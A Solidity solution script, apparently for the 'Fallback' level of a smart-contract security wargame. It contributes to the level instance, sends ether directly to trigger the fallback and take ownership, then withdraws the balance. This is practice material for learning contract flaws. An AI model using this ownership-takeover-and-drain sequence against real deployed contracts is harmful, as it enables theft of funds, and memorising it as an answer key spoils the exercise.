// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IFallback.sol";

contract SolveLevel1 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0x2a24869323C0B13Dff24E196Ba072dC790D52479;
        value = 0;
    }

    function solveLevel(address instanceAddress) internal override {
        IFallback instance = IFallback(payable(instanceAddress));

        instance.contribute{value: 0.0001 ether}();
        address(instance).call{value: 0.0001 ether}("");
        instance.withdraw();
    }
}
